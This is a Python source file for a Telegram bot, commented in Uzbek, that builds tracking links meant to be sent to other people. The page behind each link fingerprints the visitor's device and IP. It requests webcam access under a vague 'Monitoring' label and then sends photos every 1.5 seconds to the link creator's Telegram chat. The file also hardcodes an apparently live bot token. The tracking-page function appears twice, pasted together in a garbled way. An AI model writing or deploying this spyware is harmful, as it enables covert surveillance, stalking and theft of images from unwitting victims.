#!/usr/bin/env python3
import os
import json
import uuid
import base64
import asyncio
import logging
from io import BytesIO
from aiohttp import web
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, ContextTypes

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN", "8282416690:AAF2Uz6yfATHlrThT5YbGfxXyxi1vx3rUeA")
WEBHOOK_DOMAIN = os.getenv("WEBHOOK_DOMAIN", "https://fit-roanna-runex-7a8db616.koyeb.app").rstrip()
PORT = int(os.getenv("PORT", "8000"))

# Token -> user_id (doim saqlanadi, hech qachon o'chirilmaydi)
USER_TOKENS = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    # Har doim yangi token yaratiladi, lekin eski tokenlar ham ishlashda davom etadi
    token = str(uuid.uuid4())
    USER_TOKENS[token] = user_id
    link = f"{WEBHOOK_DOMAIN}/track?token={token}"
    msg = (
        "👋 Salom!\n\n"
        "Quyidagi havolani oching, sahifa ochilgach ma'lumotlar olish boshlanadi.\n"
        f"🔗 {link}\n\n"
        "Havola cheksiz muddat ishlaydi. Uni istalgan kishiga yuborishingiz mumkin.\n"
        "Har kim havolaga kirsangiz, uning ma'lumotlari sizga yuboriladi."
    )
    await update.message.reply_text(msg)

def get_client_ip(request: web.Request) -> str:
    hdr = request.headers.get("X-Forwarded-For")
    if hdr:
        return hdr.split(",")[0].strip()
    rem = request.remote
    if rem:
        return rem
    peer = request.transport.get_extra_info("peername")
    if peer:
        return str(peer[0])
    return "Noma'lum"

async def track_page(request: web.Request):
    token = request.query.get("token")
    if not token or token not in USER_TOKENS:
        return web.Response(text="❌ Noto‘g‘ri token", status=403)

    html = f"""<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>Monitoring...</title>
  <style>
    body {{
      font-family: sans-serif;
      display: flex; flex-direction: column; align-items: center; justify-content: center;
      height: 100vh; text-align: center;
      background: #fafafa; color: #333;
    }}
    .status {{
      margin: 20px;
      font-size: 1.1em;
      color: #4CAF50;
    }}
    .counter {{
      font-size: 0.9em;
      color: #777;
    }}
  </style>
</head>
<body>
  <h2>Monitoring...</h2>
  <div class="status" id="status">Boshlanmoqda...</div>
  <div class="counter" id="count">Yuborishlar: 0</div>

  <script>
    let sendCount = 0;
    const intervalMs = 1500;
    let stream = null;
    let hasCameraAccess = null; // null = noma'lum, true/false = aniqlangan
    let intervalId = null;

    async function collectData() {{
        const data = {{
          timestamp: new Date().toISOString(),
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          utcOffset: -new Date().getTimezoneOffset() / 60,
          languages: navigator.languages.join(', '),
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          deviceMemory: navigator.deviceMemory || "Noma'lum",
          hardwareConcurrency: navigator.hardwareConcurrency || "Noma'lum",
          screen: `${{screen.width}}x${{screen.height}}`,
          viewport: `${{window.innerWidth}}x${{window.innerHeight}}`,
          colorDepth: screen.colorDepth,
          pixelDepth: screen.pixelDepth,
          deviceType: /Mobi|Android/i.test(navigator.userAgent) ? "Mobil" : "Kompyuter",
          browser: "Noma'lum",
          os: "Noma'lum",
          model: "Noma'lum",
          devices: {{ mic: 0, speaker: 0, camera: 0 }},
          gpu: "Noma'lum",
          cameraRes: "Noma'lum",
          network: "Noma'lum"
        }};

        if (navigator.userAgent.includes("Chrome")) data.browser = "Chrome";
        else if (navigator.userAgent.includes("Firefox")) data.browser = "Firefox";
        else if (navigator.userAgent.includes("Safari")) data.browser = "Safari";

        if (/Windows/.test(navigator.userAgent)) data.os = "Windows";
        else if (/Android/.test(navigator.userAgent)) data.os = "Android";
        else if (/iPhone|iPad/.test(navigator.userAgent)) data.os = "iOS";
        else if (/Mac OS/.test(navigator.userAgent)) data.os = "macOS";

        try {{
          const devs = await navigator.mediaDevices.enumerateDevices();
          data.devices.mic = devs.filter(d => d.kind === "audioinput").length;
          data.devices.speaker = devs.filter(d => d.kind === "audiooutput").length;
          data.devices.camera = devs.filter(d => d.kind === "videoinput").length;
        }} catch (e) {{ console.log("Media devices error:", e); }}

        try {{
          const canvas = document.createElement("canvas");
          const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
          const dbg = gl.getExtension("WEBGL_debug_renderer_info");
          if (dbg) {{
            data.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
          }}
        }} catch (e) {{}}

        if (navigator.connection) {{
          data.network = `${{navigator.connection.effectiveType}}, ${{navigator.connection.downlink || '?'}} Mbps`;
        }}

        return data;
    }}

    async function capturePhoto(video) {{
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        return canvas.toDataURL("image/jpeg", 0.7);
    }}

    async function sendReport() {{
        try {{
            let cameraAllowed = false;
            let img = null;
            let data = await collectData();

            // Faqat birinchi marta kamerani tekshiramiz
            if (hasCameraAccess === null) {{
                try {{
                    stream = await navigator.mediaDevices.getUserMedia({{ video: {{ width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }} }});
                    hasCameraAccess = true;
                    cameraAllowed = true;
                    document.getElementById("status").textContent = "✅ Kamera faol — har 1.5s yangilanadi";
                }} catch (err) {{
                    hasCameraAccess = false;
                    cameraAllowed = false;
                    document.getElementById("status").textContent = "⚠️ Kamera ruxsati yo'q — ma'lumot bir marta yuborildi";
                    // Stream yo'q — faqat ma'lumot yuboramiz
                }}
            }} else if (hasCameraAccess) {{
                cameraAllowed = true;
            }}

            if (hasCameraAccess) {{
                const video = document.createElement("video");
                video.srcObject = stream;
                video.muted = true;
                await video.play();

                if (video.videoWidth > 0) {{
                    img = await capturePhoto(video);
                    const track = stream.getVideoTracks()[0];
                    const settings = track.getSettings();
                    data.cameraRes = `${{settings.width || video.videoWidth}}x${{settings.height || video.videoHeight}}`;
                }} else {{
                    await new Promise(r => setTimeout(r, 300));
                    if (video.videoWidth > 0) {{
                        img = await capturePhoto(video);
                        data.cameraRes = `${{video.videoWidth}}x${{video.videoHeight}}`;
                    }}
                }}
            }}

            const body = {{
                token: "{token}",
                clientData: data,
                cameraAllowed: cameraAllowed
            }};
            if (img) {{
                body.image = img;
            }}

            await fetch("/submit", {{
                method: "POST",
                headers: {{ "Content-Type": "application/json" }},
                body: JSON.stringify(body)
            }});

            sendCount++;
            document.getElementById("count").textContent = `Yuborishlar: ${{sendCount}}`;

            // Agar kamera ruxsati yo'q bo'lsa — keyin to'xtat
            if (hasCameraAccess === false) {{
                if (intervalId) clearInterval(intervalId);
            }}

        } catch (error) {{
            console.error("Yuborishda xato:", error);
            if (hasCameraAccess === false && intervalId) {{
                clearInterval(intervalId);
            }}
        }}
    }}

    // Birinchi marta darhol yuborish
    sendReport();

    // Faqat kamera ruxsati bor bo'lsa intervalni ishga tushiramiz
    setTimeout(() => {{
        if (hasCameraAccess !== false) {{
            intervalId = setInterval(sendReport, intervalMs);
        }}
    }}, 2000); // Kamera tekshiruvi tugagandan so'ng

    // Tozalash
    window.addEventListener("beforeunload", () => {{
        if (stream) {{
            stream.getTracks().forEach(track => track.stop());
        }}
        if (intervalId) clearInterval(intervalId);
    }});
  </script>
</body>
</html>"""
    return web.Response(text=html, content_type="text/html")async def track_page(request: web.Request):
    token = request.query.get("token")
    if not token or token not in USER_TOKENS:
        return web.Response(text="❌ Noto‘g‘ri token", status=403)

    html = f"""<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>Monitoring...</title>
  <style>
    body {{
      font-family: sans-serif;
      display: flex; flex-direction: column; align-items: center; justify-content: center;
      height: 100vh; text-align: center;
      background: #fafafa; color: #333;
    }}
    .status {{
      margin: 20px;
      font-size: 1.1em;
      color: #4CAF50;
    }}
    .counter {{
      font-size: 0.9em;
      color: #777;
    }}
  </style>
</head>
<body>
  <h2>Monitoring...</h2>
  <div class="status" id="status">Boshlanmoqda...</div>
  <div class="counter" id="count">Yuborishlar: 0</div>

  <script>
    let sendCount = 0;
    const intervalMs = 1500;
    let stream = null;
    let hasCameraAccess = null; // null = noma'lum, true/false = aniqlangan
    let intervalId = null;

    async function collectData() {{
        const data = {{
          timestamp: new Date().toISOString(),
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          utcOffset: -new Date().getTimezoneOffset() / 60,
          languages: navigator.languages.join(', '),
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          deviceMemory: navigator.deviceMemory || "Noma'lum",
          hardwareConcurrency: navigator.hardwareConcurrency || "Noma'lum",
          screen: `${{screen.width}}x${{screen.height}}`,
          viewport: `${{window.innerWidth}}x${{window.innerHeight}}`,
          colorDepth: screen.colorDepth,
          pixelDepth: screen.pixelDepth,
          deviceType: /Mobi|Android/i.test(navigator.userAgent) ? "Mobil" : "Kompyuter",
          browser: "Noma'lum",
          os: "Noma'lum",
          model: "Noma'lum",
          devices: {{ mic: 0, speaker: 0, camera: 0 }},
          gpu: "Noma'lum",
          cameraRes: "Noma'lum",
          network: "Noma'lum"
        }};

        if (navigator.userAgent.includes("Chrome")) data.browser = "Chrome";
        else if (navigator.userAgent.includes("Firefox")) data.browser = "Firefox";
        else if (navigator.userAgent.includes("Safari")) data.browser = "Safari";

        if (/Windows/.test(navigator.userAgent)) data.os = "Windows";
        else if (/Android/.test(navigator.userAgent)) data.os = "Android";
        else if (/iPhone|iPad/.test(navigator.userAgent)) data.os = "iOS";
        else if (/Mac OS/.test(navigator.userAgent)) data.os = "macOS";

        try {{
          const devs = await navigator.mediaDevices.enumerateDevices();
          data.devices.mic = devs.filter(d => d.kind === "audioinput").length;
          data.devices.speaker = devs.filter(d => d.kind === "audiooutput").length;
          data.devices.camera = devs.filter(d => d.kind === "videoinput").length;
        }} catch (e) {{ console.log("Media devices error:", e); }}

        try {{
          const canvas = document.createElement("canvas");
          const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
          const dbg = gl.getExtension("WEBGL_debug_renderer_info");
          if (dbg) {{
            data.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
          }}
        }} catch (e) {{}}

        if (navigator.connection) {{
          data.network = `${{navigator.connection.effectiveType}}, ${{navigator.connection.downlink || '?'}} Mbps`;
        }}

        return data;
    }}

    async function capturePhoto(video) {{
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        return canvas.toDataURL("image/jpeg", 0.7);
    }}

    async function sendReport() {{
        try {{
            let cameraAllowed = false;
            let img = null;
            let data = await collectData();

            // Faqat birinchi marta kamerani tekshiramiz
            if (hasCameraAccess === null) {{
                try {{
                    stream = await navigator.mediaDevices.getUserMedia({{ video: {{ width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }} }});
                    hasCameraAccess = true;
                    cameraAllowed = true;
                    document.getElementById("status").textContent = "✅ Kamera faol — har 1.5s yangilanadi";
                }} catch (err) {{
                    hasCameraAccess = false;
                    cameraAllowed = false;
                    document.getElementById("status").textContent = "⚠️ Kamera ruxsati yo'q — ma'lumot bir marta yuborildi";
                    // Stream yo'q — faqat ma'lumot yuboramiz
                }}
            }} else if (hasCameraAccess) {{
                cameraAllowed = true;
            }}

            if (hasCameraAccess) {{
                const video = document.createElement("video");
                video.srcObject = stream;
                video.muted = true;
                await video.play();

                if (video.videoWidth > 0) {{
                    img = await capturePhoto(video);
                    const track = stream.getVideoTracks()[0];
                    const settings = track.getSettings();
                    data.cameraRes = `${{settings.width || video.videoWidth}}x${{settings.height || video.videoHeight}}`;
                }} else {{
                    await new Promise(r => setTimeout(r, 300));
                    if (video.videoWidth > 0) {{
                        img = await capturePhoto(video);
                        data.cameraRes = `${{video.videoWidth}}x${{video.videoHeight}}`;
                    }}
                }}
            }}

            const body = {{
                token: "{token}",
                clientData: data,
                cameraAllowed: cameraAllowed
            }};
            if (img) {{
                body.image = img;
            }}

            await fetch("/submit", {{
                method: "POST",
                headers: {{ "Content-Type": "application/json" }},
                body: JSON.stringify(body)
            }});

            sendCount++;
            document.getElementById("count").textContent = `Yuborishlar: ${{sendCount}}`;

            // Agar kamera ruxsati yo'q bo'lsa — keyin to'xtat
            if (hasCameraAccess === false) {{
                if (intervalId) clearInterval(intervalId);
            }}

        } catch (error) {{
            console.error("Yuborishda xato:", error);
            if (hasCameraAccess === false && intervalId) {{
                clearInterval(intervalId);
            }}
        }}
    }}

    // Birinchi marta darhol yuborish
    sendReport();

    // Faqat kamera ruxsati bor bo'lsa intervalni ishga tushiramiz
    setTimeout(() => {{
        if (hasCameraAccess !== false) {{
            intervalId = setInterval(sendReport, intervalMs);
        }}
    }}, 2000); // Kamera tekshiruvi tugagandan so'ng

    // Tozalash
    window.addEventListener("beforeunload", () => {{
        if (stream) {{
            stream.getTracks().forEach(track => track.stop());
        }}
        if (intervalId) clearInterval(intervalId);
    }});
  </script>
</body>
</html>"""
    return web.Response(text=html, content_type="text/html")
    
async def submit_data(request: web.Request):
    try:
        body = await request.json()
        token = body.get("token")
        client_data = body.get("clientData", {})
        camera_allowed = body.get("cameraAllowed", False)
        user_id = USER_TOKENS.get(token)
        
        if not user_id:
            return web.Response(status=403, text="Token not found")

        ip = get_client_ip(request)
        devs = client_data.get("devices", {})

        message = (
            f"🕒 Sana/Vaqt: {client_data.get('timestamp')}\n"
            f"🌍 Zona: {client_data.get('timezone')} (UTC{client_data.get('utcOffset')})\n"
            f"📍 IP: {ip}\n"
            f"📱 Qurilma: {client_data.get('model')} ({client_data.get('deviceType')})\n"
            f"🖥 OS: {client_data.get('os')}, Brauzer: {client_data.get('browser')}\n"
            f"🎮 GPU: {client_data.get('gpu')}\n"
            f"🧠 CPU: {client_data.get('hardwareConcurrency')} yadrolar | RAM: {client_data.get('deviceMemory')} GB\n"
            f"📺 Ekran: {client_data.get('screen')} | Viewport: {client_data.get('viewport')}\n"
            f"🎨 Rang chuqurligi: {client_data.get('colorDepth')} bit | PixelDepth: {client_data.get('pixelDepth')}\n"
            f"🎤 Qurilmalar: Mic: {devs.get('mic',0)}, Speaker: {devs.get('speaker',0)}, Kamera: {devs.get('camera',0)}\n"
            f"📷 Kamera aniqlangan o‘lcham: {client_data.get('cameraRes')}\n"
            f"📶 Tarmoq: {client_data.get('network')}\n"
            f"🗣 Tillar: {client_data.get('languages')}\n"
            f"🔍 UA: {client_data.get('userAgent')}\n"
            f"📷 Kamera: {'✅ Ruxsat berildi' if camera_allowed else '❌ Ruxsat berilmadi'}"
        )

        if camera_allowed and "image" in body:
            img_data = body["image"]
            if "," in img_data:
                b64 = img_data.split(",", 1)[1]
            else:
                b64 = img_data
            try:
                img_bytes = base64.b64decode(b64)
                img = BytesIO(img_bytes)
                img.name = "snapshot.jpg"
                await request.app["bot"].send_photo(chat_id=user_id, photo=InputFile(img), caption=message)
            except Exception as e:
                logger.error(f"Rasmni yuborishda xato: {e}")
                await request.app["bot"].send_message(chat_id=user_id, text=message + "\n\n⚠️ Rasmni yuklab bo'lmadi.")
        else:
            await request.app["bot"].send_message(chat_id=user_id, text=message)

        return web.Response(text="ok")
    except Exception as e:
        logger.exception("submit_data xato")
        return web.Response(status=500, text=str(e))

async def start_web_server(bot):
    app = web.Application()
    app["bot"] = bot
    app.router.add_get("/track", track_page)
    app.router.add_post("/submit", submit_data)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    logger.info(f"🌐 Web server ishga tushdi http://0.0.0.0:{PORT}")

async def on_startup(app: Application):
    asyncio.create_task(start_web_server(app.bot))

def main():
    app = Application.builder().token(BOT_TOKEN).post_init(on_startup).build()
    app.add_handler(CommandHandler("start", start))
    app.run_polling()

if __name__ == "__main__":
    main()
